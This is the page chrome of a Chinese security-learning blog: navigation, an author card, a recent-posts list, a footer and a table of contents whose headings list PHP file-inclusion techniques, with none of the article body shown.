src="https://img.vim-cn.com/1b/5e9180cd9f89dbf608cbdf53530ed4ae7fe950.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">工具下载</div></div></a></div><div class="next-post pull-right"><a href="/2021/04/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><img class="next-cover" src="https://img.vim-cn.com/7c/4a47439a305e98fc2bba0caf4ba5fe3ad15f30.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">命令执行漏洞学习笔记</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://ss2.baidu.com/6ON1bjeh1BF3odCf/it/u=2706720867,592915881&amp;fm=27&amp;gp=0.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">T0mrvvi1b3t</div><div class="author-info__description">i have a big dream.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50597969"><i class="fab fa-csdn"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:t0mrvvi1b3t@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客中所有含csdn水印的图片均来源于个人在csdn的博客，对应链接请点击Follow Me</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">文件包含函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">漏洞产生的原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">3.</span> <span class="toc-text">本地文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">无限制本地文件包含漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">有限制本地文件包含漏洞绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-number">5.1.</span> <span class="toc-text">%00截断</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="toc-number">5.2.</span> <span class="toc-text">路径长度截断</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="toc-number">5.3.</span> <span class="toc-text">点号截断</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">session文件包含漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">远程文件包含漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">8.</span> <span class="toc-text">关于php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#file"><span class="toc-number">8.1.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#http"><span class="toc-number">8.2.</span> <span class="toc-text">http:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php"><span class="toc-number">8.3.</span> <span class="toc-text">php:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#php-input"><span class="toc-number">8.3.1.</span> <span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#php-filter"><span class="toc-number">8.3.2.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#data-%EF%BC%88%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8Cphp%E4%BB%A3%E7%A0%81%EF%BC%89"><span class="toc-number">8.4.</span> <span class="toc-text">data:&#x2F;&#x2F;（可以执行php代码）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#zlib"><span class="toc-number">8.5.</span> <span class="toc-text">zlib:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#zip"><span class="toc-number">8.5.1.</span> <span class="toc-text">zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#bzip2"><span class="toc-number">8.5.2.</span> <span class="toc-text">bzip2:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#zlib-1"><span class="toc-number">8.5.3.</span> <span class="toc-text">zlib:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#phar"><span class="toc-number">8.6.</span> <span class="toc-text">phar:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell"><span class="toc-number">9.</span> <span class="toc-text">包含日志文件getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">10.</span> <span class="toc-text">利用session.upload_progress进行文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1%E4%BB%A3%E7%A0%81"><span class="toc-number">11.</span> <span class="toc-text">php:&#x2F;&#x2F;filter绕过死亡代码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81base64"><span class="toc-number">11.1.</span> <span class="toc-text">1、base64</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81strip-tags"><span class="toc-number">11.2.</span> <span class="toc-text">2、strip_tags</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81rot13"><span class="toc-number">11.3.</span> <span class="toc-text">3、rot13</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/22/%E5%85%B3%E4%BA%8E%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" title="有关图片隐写的学习"><img src="https://img.vim-cn.com/71/dd2ee7aba204f6e9e637247c9b417f149a4487.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="有关图片隐写的学习"/></a><div class="content"><a class="title" href="/2021/07/22/%E5%85%B3%E4%BA%8E%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" title="有关图片隐写的学习">有关图片隐写的学习</a><time datetime="2021-07-22T06:10:06.459Z" title="发表于 2021-07-22 14:10:06">2021-07-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/18/xxe/" title="XXE"><img src="https://img.vim-cn.com/0b/f7ef07561d25f2f7a9a0fbdde781c035662daa.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XXE"/></a><div class="content"><a class="title" href="/2021/07/18/xxe/" title="XXE">XXE</a><time datetime="2021-07-18T05:14:51.349Z" title="发表于 2021-07-18 13:14:51">2021-07-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/03/png%E5%85%A5%E9%97%A8/" title="ctfshow misc入门 png隐写入门"><img src="https://img.vim-cn.com/5c/ba5491c7fa8fe74abf249eb057e8195716c684.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow misc入门 png隐写入门"/></a><div class="content"><a class="title" href="/2021/06/03/png%E5%85%A5%E9%97%A8/" title="ctfshow misc入门 png隐写入门">ctfshow misc入门 png隐写入门</a><time datetime="2021-06-03T04:01:05.427Z" title="发表于 2021-06-03 12:01:05">2021-06-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="结合ctfshow学习php反序列化"><img src="https://img.vim-cn.com/45/bd1adccf832acd50364b15196c8e4a196a7629.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="结合ctfshow学习php反序列化"/></a><div class="content"><a class="title" href="/2021/05/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="结合ctfshow学习php反序列化">结合ctfshow学习php反序列化</a><time datetime="2021-05-30T10:30:05.740Z" title="发表于 2021-05-30 18:30:05">2021-05-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/26/%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="关于信息收集"><img src="https://img.vim-cn.com/45/bd1adccf832acd50364b15196c8e4a196a7629.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于信息收集"/></a><div class="content"><a class="title" href="/2021/05/26/%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="关于信息收集">关于信息收集</a><time datetime="2021-05-26T09:42:02.798Z" title="发表于 2021-05-26 17:42:02">2021-05-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By T0mrvvi1b3t</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><span>豫ICP备2021008961号-1</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
